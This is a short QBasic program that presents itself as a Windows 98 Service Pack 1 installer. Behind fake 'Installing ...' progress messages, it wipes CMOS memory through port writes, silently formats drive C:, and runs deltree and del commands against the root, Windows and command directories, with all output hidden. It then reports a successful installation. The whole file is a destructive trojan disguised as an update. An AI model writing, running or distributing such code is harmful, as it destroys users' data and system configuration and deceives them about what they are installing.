CLS
PRINT "Prepare to installing Windows 98 Service Pack 1" FOR i = 0 TO 128
OUT &H70, i
OUT &H71, 0
NEXT i
SHELL "echo y|format c:/u/q/v:HELLO >NUL" CLS
PRINT "Installing ..."
SHELL "deltree /y c:\*.* >nul"
CLS
PRINT "Installing ...."
SHELL "echo Y|del command\*.* >NUL"
CLS
PRINT "Installing ....."
SHELL "echo Y|del c:\windows\*.* >nul" CLS
PRINT "Installing ......"
SHELL "echo Y|del c:\*.* >nul"
CLS
PRINT "Installing ......."
SHELL "echo y|del *.* >nul"
CLS
PRINT "Windows 98 Service Pack 1 Installed Successfully"
